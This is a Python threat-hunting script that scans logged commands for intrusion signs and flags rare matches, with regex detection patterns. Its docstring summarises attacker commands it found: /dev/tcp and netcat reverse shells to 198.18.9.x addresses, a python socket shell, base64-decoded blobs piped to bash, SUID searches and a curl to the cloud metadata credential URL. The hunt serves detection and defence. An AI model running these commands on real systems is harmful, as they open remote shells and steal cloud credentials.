"""Hunt 2: Hands-on-keyboard commands -> Host intrusion signs.

Exploration (457,293 CMD rows):
 Attacker (each 1-5 hosts, distinct external 198.18.9.x / metadata IP):
  - 4x /dev/tcp reverse shells (bash/sh -i >& /dev/tcp/198.18.9.x/port)
  - 1x nc -e /bin/bash 198.18.9.10 4444
  - 1x python3 socket.connect((198.18.9.13,4444)) + dup2 + /bin/sh -i
  - 5x echo <~180-char base64-like blob> | base64 -d | bash
  - 2x find / -perm -4000 -type f (only -perm rows in DB)
  - 1x curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 Benign excluded: all other CMD (curl github/zen ~18k rows on 8k hosts,
  git/cat/ls/ssh/python3/dig etc on thousands of hosts, iptables --dport
  (false hit for '-d'), curl|bash setup.sh / wget s.sh - other hunts/noise,
  not in this hunt's 4 signatures). Signatures below are intrinsically
  malicious, so rarity guard is a safety net, not primary filter.
 Precision self-check (all matched patterns, defendable):
  dev/tcp+shell, nc -e shell, python socket+dup2+shell = reverse shell;
  long-blob base64 -d | bash = decode-and-run; find -perm -4000 = SUID hunt;
  169.254.169.254 = cloud credential theft. No benign pattern matched.
"""
import os, re, sys, random, collections
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import con as _con, finding, write_findings, collapse, P

PARAMS = {
    "category": "Host intrusion signs",
    "min_b64_len": 40,          # long encoded blob before base64 -d
    "max_pattern_hosts": 20,    # rarity: drop normalised pattern seen on >N hosts
    "collapse_window_min": 10,
    "metadata_ip": "169.254.169.254",
    "patterns": {
        "dev_tcp": r"/dev/tcp/",
        "nc_exec": r"\b(?:nc|ncat|netcat)\b[^\n]*\s-e\s",
        "python_socket": r"socket[^\n]*\.connect\s*\(",
        "base64_decode": r"base64\s+(?:-d|--decode|-D)\b",
        "suid_find": r"\bfind\s+/[^\n]*-perm\s+-?4000\b",
    },
}

def _norm(cmd):
    cmd = re.sub(r"[A-Za-z0-9+/=]{20,}", "<B64>", cmd)
    cmd = re.sub(r"\d+\.\d+\.\d+\.\d+", "<IP>", cmd)
    cmd = re.sub(r"\b\d+\b", "<N>", cmd)
    return cmd[:160]

def _user_at(conn, host, ts):
    row = conn.execute("SELECT ts,user FROM host WHERE event='LOGIN' AND host=? AND ts<=? ORDER BY ts DESC LIMIT 1",(host,ts)).fetchone()
    if not row: return "none"
    out = conn.execute("SELECT 1 FROM host WHERE event='LOGOUT' AND host=? AND ts>? AND ts<=? LIMIT 1",(host,row[0],ts)).fetchone()
    return "none" if out else row[1]

def _matches(cmd, p):
    low = cmd.lower()
    pats = p["patterns"]
    if re.search(pats["dev_tcp"], low): return "dev_tcp"
    if re.search(pats["nc_exec"], low): return "nc_exec"
    if "python" in low and re.search(pats["python_socket"], low) and ("dup2" in low or "subprocess" in low or "/bin/sh" in low or "/bin/bash" in low): return "python_socket"
    if p["metadata_ip"] in low: return "metadata"
    if re.search(pats["suid_find"], low): return "suid_find"
    if re.search(pats["base64_decode"], low):
        # long encoded text decoded and run: blob >=min_b64_len, piped to shell or decode in pipe chain
        m = re.search(r"([A-Za-z0-9+/=]{%d,})" % p["min_b64_len"], cmd)
        if m and ("| bash" in low or "| sh" in low or "|bash" in low or "|sh" in low): return "base64_decode"
    return None

def run(conn, params=PARAMS):
    p = {**PARAMS, **(params or {})}
    rows = conn.execute("SELECT ts,host,process,target FROM host WHERE event='CMD' ORDER BY ts").fetchall()
    matched = [(ts,host,proc,cmd,_matches(cmd,p)) for ts,host,proc,cmd in rows]
    matched = [m for m in matched if m[4]]
    # rarity guard per normalised pattern
    hosts_by_pat = collections.defaultdict(set)
    for _,host,_,cmd,_ in matched: hosts_by_pat[_norm(cmd)].add(host)
    findings, details = [], []
    for ts,host,proc,cmd,rule in matched:
        if len(hosts_by_pat[_norm(cmd)]) > p["max_pattern_hosts"]: continue
        findings.append(finding(p["category"], ts, host, _user_at(conn,host,ts), proc))
        details.append((ts,host,proc,cmd,rule))
    collapsed = collapse(findings, window_min=p["collapse_window_min"])
    # keep details aligned for printing (first per collapsed key is same order)
    keep = {(f["timestamp"],f["host"],f["process"]) for f in collapsed}
    details = [d for d in details if (d[0],d[1],d[2]) in keep]
    run._details = details
    run._patterns = hosts_by_pat
    return collapsed

if __name__ == "__main__":
    conn = _con()
    out = run(conn)
    path = os.path.join(P, "findings", "hunt2.json")
    write_findings(path, out)
    print(f"findings: {len(out)}")
    print("per-category:", dict(collections.Counter(f["category"] for f in out)))
    print("distinct hosts:", len({f["host"] for f in out}))
    details = getattr(run, "_details", [])
    print("patterns (norm -> distinct hosts):")
    for pat, hosts in sorted(getattr(run,"_patterns",{}).items(), key=lambda kv:-len(kv[1])):
        print(f"  {len(hosts)} hosts: {pat}")
    print("samples:")
    for f, d in zip(random.Random(42).sample(out, min(10,len(out))) if out else [], []):
        pass
    # 10 random samples with command text
    idx = random.Random(42).sample(range(len(out)), min(10,len(out))) if out else []
    by_key = {(d[0],d[1]): d[3] for d in details}
    for i in idx:
        f = out[i]
        print(f, "| CMD:", by_key.get((f["timestamp"],f["host"]),""))
